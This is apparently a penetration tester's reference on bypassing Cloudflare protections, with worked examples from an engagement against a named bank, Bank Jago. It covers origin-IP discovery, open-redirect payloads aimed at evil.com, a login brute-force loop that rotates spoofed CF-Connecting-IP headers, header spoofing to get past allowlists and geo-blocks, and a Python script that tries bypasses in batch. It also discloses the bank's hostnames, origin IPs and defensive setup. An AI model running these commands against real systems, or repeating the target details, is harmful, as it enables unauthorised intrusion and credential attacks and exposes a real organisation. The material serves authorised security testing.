# Cloudflare Bypass & Assessment Techniques

Practical reference for penetration testing targets behind Cloudflare infrastructure.

---

## 1. Origin IP Discovery

The goal: find the real server IP behind CF's reverse proxy to bypass WAF/access controls entirely.

### Historical DNS Records

```bash
# SecurityTrails - historical A records before CF onboarding
curl -s "https://api.securitytrails.com/v1/history/$DOMAIN/dns/a" \
  -H "APIKEY: $ST_KEY" | jq '.records[].values[].ip'

# Also check subdomains that were never proxied
curl -s "https://api.securitytrails.com/v1/domain/$DOMAIN/subdomains" \
  -H "APIKEY: $ST_KEY"
```

### Shodan Certificate Search

```bash
# Find servers presenting the target's TLS cert but NOT on CF IP ranges
shodan search "ssl.cert.subject.cn:target.com" --fields ip_str,port,org \
  | grep -v "Cloudflare"

# Censys alternative
censys search "services.tls.certificates.leaf.names: target.com" \
  | grep -v "162.158\|104.16\|172.67\|141.101"
```

### Email Headers

Outbound email from the target often reveals origin IPs:
- Subscribe to newsletters, trigger password resets, contact forms
- Check `Received:` headers for internal IPs
- Check `X-Originating-IP`, `Return-Path` MX records

```bash
# Resolve MX and check if it shares infrastructure with web
dig MX target.com +short
# Often the mail server is on the same host/subnet as web
```

### Zone File Analysis (cf-proxied: false)

**Bank Jago example:** Zone file export revealed hosts with `cf-proxied: false` — these resolve directly to origin IPs without CF protection.

```bash
# If you have zone file access or can enumerate:
dig +short subdomain.target.com
# If response is NOT in CF ranges (104.16.0.0/12, 172.67.0.0/16, etc.) → direct origin

# CF IP ranges for filtering:
# https://www.cloudflare.com/ips-v4
# 173.245.48.0/20, 103.21.244.0/22, 103.22.200.0/22, 103.31.4.0/22
# 141.101.64.0/18, 108.162.192.0/18, 190.93.240.0/20, 188.114.96.0/20
# 197.234.240.0/22, 198.41.128.0/17, 162.158.0.0/15, 104.16.0.0/13
# 104.24.0.0/14, 172.64.0.0/13
```

**Priority:** Non-proxied hosts are your #1 targets. They bypass ALL CF protections.

### Stale Zone File → Origin IP Leak

Zone files may contain **stale A records** from before CF onboarding. Compare zone file IPs against live DNS:

```python
import socket

# Zone file says: bibit.jago.com → 34.50.79.16 (GCP IP)
# Live DNS resolves: bibit.jago.com → 104.18.39.232 (CF IP)
# → Zone file leaked the real origin IP!

zone_ip = "34.50.79.16"  # From zone file
live_ip = socket.getaddrinfo("bibit.jago.com", 443)[0][4][0]
if live_ip != zone_ip:
    print(f"ORIGIN LEAK: zone={zone_ip}, live={live_ip} (CF)")
```

**Bank Jago example:** Zone file had GCP origin IPs (34.x.x.x) while live DNS pointed to CF (104.18.39.232). Five origin IPs discovered this way.

**Exploitation attempt results:**
- 4/5 origins: ALL PORTS FILTERED (GCP firewall drops packets entirely)
- 1/5 origin (dev): ports 80/443 open but returns generic 403 on all paths/hosts (GCP LB IP allowlist — only allows CF edge IPs)

**Conclusion:** Origin IP leak from zone file is an **info disclosure** finding but often NOT directly exploitable because well-configured origins have their own IP allowlist restricting to CF edge ranges. Still worth documenting — it reveals infrastructure and may become exploitable if firewall rules change.

---

## 2. Distinguishing Cloudflare Products

Different CF products have distinct response signatures. Correct identification determines your approach.

### CF WAF / Bot Management

```
HTTP/2 403
server: cloudflare
cf-ray: 8a1b2c3d4e5f-SIN
cf-cache-status: DYNAMIC
content-type: text/html; charset=UTF-8

<!-- Standard CF block page with challenge JS or CAPTCHA -->
<!-- Ray ID visible in HTML body -->
```

- Response varies by request (different rays, sometimes challenges)
- May return 503 with JS challenge (IUAM - "I'm Under Attack Mode")
- `cf-mitigated: challenge` header on blocked requests

### CF API Shield

```
HTTP/2 403
content-type: application/json

{"success":false,"errors":[{"code":10000,"message":"MISSING_API_TOKEN"}]}
```

**Bank Jago example:** `api.jago.com` returns `MISSING_API_TOKEN` — this is API Shield requiring mTLS client cert or API token in specific header.

- Requires valid API token (usually `Authorization: Bearer` or custom header)
- May require mTLS client certificate
- Schema validation rejects malformed requests before they hit origin

### CF Zero Trust Access (formerly CF Access)

```
HTTP/2 302
location: https://target.cloudflareaccess.com/cdn-cgi/access/login/target.com?...

# Or inline login page with CF Access branding
# Cookie: CF_Authorization=<JWT>
```

- Redirects to `*.cloudflareaccess.com` login
- After auth, sets `CF_Authorization` JWT cookie
- JWT contains identity claims — decode to understand access model
- Sometimes misconfigured: try accessing with `CF_Authorization` cookie from another app in same org

#### CF Access Endpoint Testing (MANDATORY)

Even when the origin is gated, always test CF Access's own endpoints:

```bash
# 1. Open Redirect on logout (patched in CF version 20-df9b4f3, but test anyway)
curl -sI "https://target.com/cdn-cgi/access/logout?returnTo=http://evil.com"
# Vulnerable: 302 → http://evil.com
# Patched: 400 "Invalid redirect URL" or 200 "No Access cookie found"

# 2. Identity leak (requires valid CF_Authorization cookie)
curl -s "https://target.com/cdn-cgi/access/get-identity" -H "Cookie: CF_Authorization=<jwt>"
# May leak: email, name, groups, IdP metadata

# 3. Public certs (always accessible, reveals Access policy config)
curl -s "https://target.com/cdn-cgi/access/certs"
# Returns JWT signing keys — use to validate/forge CF_Authorization tokens

# 4. Login endpoint enumeration
curl -sI "https://target.com/cdn-cgi/access/login"
# Reveals configured IdP (Google, Okta, Azure AD, etc.)

# 5. Authorized endpoint (session validation)
curl -s "https://target.com/cdn-cgi/access/authorized"
# 400/401 without cookie, 200 with valid cookie — confirms access policy exists
```

**Open redirect bypass attempts** (if returnTo returns 400 "Invalid redirect URL"):
```bash
# Parameter case variations (CF only recognizes `returnTo` camelCase)
?ReturnTo=http://evil.com    # Ignored (200, no redirect)
?returnTo=http://evil.com    # Processed (400 = validated and blocked)
?return_to=http://evil.com   # Ignored (200, no redirect)

# URL validation bypasses to try:
?returnTo=//evil.com
?returnTo=http://target.com@evil.com
?returnTo=http://evil.com%23.target.com
?returnTo=https://target.com.evil.com
?returnTo=http:\\evil.com
?returnTo=http:/evil.com
```

**Key insight:** If `returnTo` returns 400 but `ReturnTo` returns 200, CF is processing the parameter but blocking it. The redirect was patched ~2024. On older CF versions (pre-20-df9b4f3), this was a valid open redirect.

### CF IP Allowlist (Access Policy: IP-based)

```
HTTP/2 403
server: cloudflare
content-length: 5463
content-type: text/html

<!-- Generic CF 403 page, identical across all blocked requests -->
<!-- No challenge, no variation, same byte count every time -->
```

**Bank Jago example:** 17 partner gateway hosts ALL return identical 403 with exactly 5463 bytes. This signature = IP allowlist at CF edge. Key indicators:
- **Identical response body size** across all hosts (5463 bytes)
- **No challenge/JS** — pure deny
- **No variation** regardless of path, method, headers, or payload
- **Same behavior on all subdomains** in the group

This means: traffic never reaches origin. No amount of header manipulation, path fuzzing, or payload crafting will bypass this. You need to be on an allowed IP.

### Quick Identification Table

| Signature | Product | Bypassable? |
|-----------|---------|-------------|
| JS challenge / CAPTCHA + cf-mitigated | WAF/Bot Mgmt | Sometimes (rate limit, header rotation) |
| MISSING_API_TOKEN JSON | API Shield | Need valid token/cert |
| Redirect to cloudflareaccess.com | Zero Trust Access | Need valid identity |
| Identical 403, fixed size, all paths | IP Allowlist | Need allowed source IP |
| Custom error, cf-ray present | Worker-based filtering | Probe for logic bugs |

---

## 3. CF Worker Detection & Backend Probing

### Detecting Workers

CF Workers intercept requests at the edge. Signs:

```bash
# Workers often only handle specific methods
# Try methods the worker doesn't explicitly handle:
curl -X POST https://target.com/ -v
curl -X OPTIONS https://target.com/ -v
curl -X PATCH https://target.com/ -v

# Worker errors have distinct signatures:
# "Error 1101: Worker threw exception"
# "Error 1102: Worker exceeded CPU time limit"
```

**Bank Jago example:** `siem.jago.com` runs a CF Worker — detected by:
- Different response characteristics vs standard CF proxy
- Worker-specific error codes (1101, 1102, 1015)
- Inconsistent behavior across HTTP methods

### Backend Probing Through Workers

```bash
# Path enumeration - workers often only route specific paths
# Unhandled paths may fall through to origin or return different errors
ffuf -u https://target.com/FUZZ -w paths.txt -mc all -fc 403

# POST method bypass - many workers only filter GET
curl -X POST https://target.com/admin -d '' -v

# Host header manipulation - worker routing may be host-dependent
curl https://target.com/ -H "Host: internal.target.com" -v

# Subdomain/path that bypasses worker route
# Workers bind to routes like: *.target.com/api/* 
# Try: target.com/api2/ or direct IP if discovered
```

### Worker Route Enumeration

```bash
# Common worker route patterns:
/cdn-cgi/          # CF internal, sometimes leaks info
/cdn-cgi/trace     # CF diagnostic endpoint (usually available)
/.well-known/      # Often not routed through worker

# cf-trace reveals CF data center, TLS version, protocol
curl https://target.com/cdn-cgi/trace
```

---

## 4. Decision Table: When to Stop on CF-Protected Targets

### Stop Conditions

| Scenario | Evidence | Action |
|----------|----------|--------|
| IP Allowlist, no origin found | Identical 403 on all paths/methods, no historical DNS, no leaked origin | **STOP** — document finding, move on |
| IP Allowlist, origin found but filtered | Origin IPs discovered (zone file/historical) but all ports filtered or LB returns 403 | **STOP** — document origin IP leak as Info, move on |
| Geo-block (all hosts same CF IP) | Multiple unrelated subdomains resolve to same CF IP (e.g., 104.18.39.232), all return identical 403 | **STOP** — likely geo/IP reputation block at account level, not per-host |
| API Shield, no creds | MISSING_API_TOKEN, no token source identified | **STOP** — note for social engineering phase |
| Zero Trust, no identity | CF Access login, no valid identity provider access | **TEST CF ENDPOINTS FIRST** then STOP |
| WAF blocking, origin unknown | Challenges on all requests, no bypass after 30min | **DEPRIORITIZE** — try origin discovery |
| WAF blocking, origin found | Have origin IP | **BYPASS** — hit origin directly |
| Worker filtering | Worker-specific errors | **PROBE** — method/path enumeration (15min timebox) |

**IMPORTANT:** "Zero Trust = STOP" does NOT mean skip the host entirely. Always test `/cdn-cgi/access/*` endpoints (logout open redirect, certs leak, identity leak) before marking as untestable. The gate itself is attack surface.

### Bank Jago Decision Flow

```
Partner Gateway (17 hosts) → Identical 403 (5463 bytes) → IP Allowlist
  → No origin IP found → STOP. Document as "CF IP Allowlist, untestable without allowed IP"

api.jago.com → MISSING_API_TOKEN → API Shield  
  → No token/cert available → STOP. Note for credential discovery phase.

siem.jago.com → CF Worker detected
  → Probe methods/paths (15min) → If no bypass → STOP.

cf-proxied:false hosts → Direct origin access
  → PRIORITY TARGETS. Full testing scope applies.
```

### General Rules

1. **Never spend >30 minutes** trying to bypass CF edge protections without a concrete lead
2. **IP Allowlist = hard stop** unless you find origin IP or get on allowed network
3. **Origin IP found = game over for CF** — test origin directly, CF is irrelevant
4. **Non-proxied hosts first** — always prioritize `cf-proxied: false` targets
5. **Document everything** — CF protection type per host goes in scope notes for client

---

## 5. CF-Specific Header Manipulation

### How CF Handles Headers

When a request passes through CF to origin:

```
Client → Cloudflare Edge → Origin Server

CF adds/overwrites these headers before forwarding to origin:
- CF-Connecting-IP: <actual client IP>        # ALWAYS set by CF, cannot be spoofed
- X-Forwarded-For: <client IP>                # Set/appended by CF
- True-Client-IP: <actual client IP>          # Enterprise only, same as CF-Connecting-IP
- CF-IPCountry: <2-letter country>            # Geolocation
- CF-RAY: <ray-id>                            # Request trace ID
- CF-Visitor: {"scheme":"https"}              # Original scheme
```

### What You CAN'T Do (Behind CF)

```bash
# These headers are OVERWRITTEN by CF — spoofing is useless when request goes through CF:
curl -H "CF-Connecting-IP: 10.0.0.1" https://cf-protected.com/     # Overwritten
curl -H "True-Client-IP: 10.0.0.1" https://cf-protected.com/       # Overwritten  
curl -H "X-Forwarded-For: 10.0.0.1" https://cf-protected.com/      # Overwritten/appended
```

### What You CAN Do (Direct to Origin)

If you find the origin IP and hit it directly (bypassing CF):

```bash
# Origin may trust these headers thinking CF set them:
curl -H "CF-Connecting-IP: 127.0.0.1" https://<origin-ip>/ -H "Host: target.com"
curl -H "True-Client-IP: 10.0.0.1" https://<origin-ip>/ -H "Host: target.com"
curl -H "X-Forwarded-For: 192.168.1.1" https://<origin-ip>/ -H "Host: target.com"

# Common origin misconfigurations:
# - Trusts CF-Connecting-IP without verifying request came from CF IP range
# - IP allowlist check uses X-Forwarded-For (spoofable when not through CF)
# - Admin panel restricted to "internal IPs" via header check
```

### Header Exploitation Scenarios

**Scenario 1: Origin found, IP allowlist on origin trusts CF-Connecting-IP**
```bash
# Origin checks CF-Connecting-IP against allowlist but doesn't verify CF source
curl -H "CF-Connecting-IP: <allowed-partner-ip>" \
     -H "Host: partner-gw.target.com" \
     https://<origin-ip>/api/endpoint
```

**Scenario 2: Rate limiting based on CF-Connecting-IP**
```bash
# If hitting origin directly, rotate this header to bypass rate limits
for ip in $(seq 1 254); do
  curl -H "CF-Connecting-IP: 10.0.0.$ip" https://<origin-ip>/login -d "user=admin&pass=test$ip"
done
```

**Scenario 3: Geo-restriction bypass**
```bash
# Origin uses CF-IPCountry for geo-blocking
curl -H "CF-IPCountry: US" -H "Host: target.com" https://<origin-ip>/us-only-content
```

### X-Forwarded-For Behavior

```
# Through CF (single proxy):
Client (1.2.3.4) → CF → Origin
Origin sees: X-Forwarded-For: 1.2.3.4

# Through CF (client sends XFF):  
Client sends XFF: 5.6.7.8 → CF → Origin
Origin sees: X-Forwarded-For: 5.6.7.8, 1.2.3.4
# CF APPENDS real IP, doesn't replace. Origin must use LAST value.

# Misconfigured origin using FIRST XFF value:
curl -H "X-Forwarded-For: 127.0.0.1" https://cf-protected.com/admin
# If origin reads first value → sees 127.0.0.1 → may grant access
# This works THROUGH CF if origin is misconfigured (reads wrong XFF position)
```

---

## Quick Reference: Bank Jago Findings

| Target | CF Product | Response Signature | Action |
|--------|-----------|-------------------|--------|
| partner-gw-*.jago.com (×17) | IP Allowlist | 403, 5463 bytes, identical | STOP |
| api.jago.com | API Shield | `MISSING_API_TOKEN` JSON | STOP (no creds) |
| siem.jago.com | CF Worker | Worker-specific behavior | PROBE (timeboxed) |
| [cf-proxied:false hosts] | None (direct) | Origin responses | **FULL TEST** |

---

## Tools & Resources

- **SecurityTrails**: Historical DNS, subdomain enumeration
- **Shodan/Censys**: Certificate-based origin discovery
- **CloudFlair**: Automated origin finder using Censys (`github.com/christophetd/CloudFlair`)
- **CrimeFlare**: Database of known CF-to-origin mappings (outdated but sometimes useful)
- **cf-check**: Verify if IP is in CF ranges
- **subfinder + dnsx**: Mass subdomain resolution to find non-proxied hosts
- **Python httpx**: Preferred over curl for systematic bypass testing (supports HTTP/2, async, programmatic header rotation)

```bash
# Quick check if host is behind CF
dig +short target.com | while read ip; do
  curl -s https://www.cloudflare.com/ips-v4 | while read range; do
    grepcidr "$range" <<< "$ip" && echo "$ip is CF"
  done
done
```

---

## 6. Systematic Bypass Testing with Python httpx

When curl is insufficient (need batch testing, response comparison, programmatic analysis), use Python httpx:

```python
import httpx
import socket

target = "https://target.com"

# Phase 1: Baseline response
r = httpx.get(target, verify=False, timeout=10)
baseline_size = len(r.content)
baseline_status = r.status_code
print(f"Baseline: {baseline_status} | {baseline_size} bytes")

# Phase 2: Bypass attempts (compare against baseline)
bypass_tests = [
    # UA spoofing
    {"name": "Googlebot", "headers": {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}},
    {"name": "Mobile Safari", "headers": {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)"}},
    # Header injection
    {"name": "XFF:127.0.0.1", "headers": {"X-Forwarded-For": "127.0.0.1"}},
    {"name": "X-Real-IP:127.0.0.1", "headers": {"X-Real-IP": "127.0.0.1"}},
    {"name": "CF-Connecting-IP spoof", "headers": {"CF-Connecting-IP": "103.21.244.0"}},
    {"name": "True-Client-IP", "headers": {"True-Client-IP": "103.21.244.0"}},
    # Method variation
    {"name": "OPTIONS", "method": "OPTIONS", "headers": {}},
    {"name": "POST JSON", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": "{}"},
    # Path tricks
    {"name": "/robots.txt", "path": "/robots.txt", "headers": {}},
    {"name": "/.well-known/security.txt", "path": "/.well-known/security.txt", "headers": {}},
    {"name": "/favicon.ico", "path": "/favicon.ico", "headers": {}},
    # Accept variation
    {"name": "Accept: application/json", "headers": {"Accept": "application/json"}},
    # Websocket
    {"name": "WS upgrade", "headers": {"Upgrade": "websocket", "Connection": "Upgrade"}},
]

for test in bypass_tests:
    method = test.get("method", "GET")
    path = test.get("path", "/")
    url = target + path if path != "/" else target
    data = test.get("data", None)
    r = httpx.request(method, url, headers=test["headers"], content=data, verify=False, timeout=10)
    marker = "!!!" if r.status_code != baseline_status or len(r.content) != baseline_size else ""
    print(f"{marker}{test['name']:35s} | {r.status_code} | {len(r.content):5d} bytes")

# Phase 3: Origin IP discovery (compare zone file vs live DNS)
zone_ips = {"target.com": "34.x.x.x"}  # From zone file
for host, zone_ip in zone_ips.items():
    live_ip = socket.getaddrinfo(host, 443)[0][4][0]
    if live_ip != zone_ip:
        print(f"ORIGIN LEAK: {host} zone={zone_ip} live={live_ip}")
        # Test origin directly
        for scheme in ["http", "https"]:
            try:
                r = httpx.get(f"{scheme}://{zone_ip}/", headers={"Host": host}, verify=False, timeout=5)
                print(f"  {scheme}://{zone_ip} | {r.status_code} | {len(r.content)} bytes")
            except Exception as e:
                print(f"  {scheme}://{zone_ip} | {str(e)[:40]}")
```

**Port 8080 on CF-proxied hosts (NOT a bypass):**
CF-proxied hosts have port 8080 open. It's Cloudflare's HTTP listener that either:
- Returns 301 → https://host/ (redirect to HTTPS), or
- Returns the same CF 403 "Attention Required" page
Do NOT report as an open port finding or bypass vector. It's standard CF infrastructure.

**Interpretation guide:**
- All responses identical size/status = geo-block or IP allowlist (hard stop)
- Specific paths return different size (e.g., 4544 vs 5463) = CF generating different error pages but still blocking (not a bypass)
- Null byte (`/%00`) returning 400 = CF's own parser rejecting, not origin (not useful)
- Origin IP timeout = firewall drops all non-CF traffic (not exploitable)
- Origin IP 403 with no server header + `alt-svc: h3` = GCP Load Balancer with IP allowlist
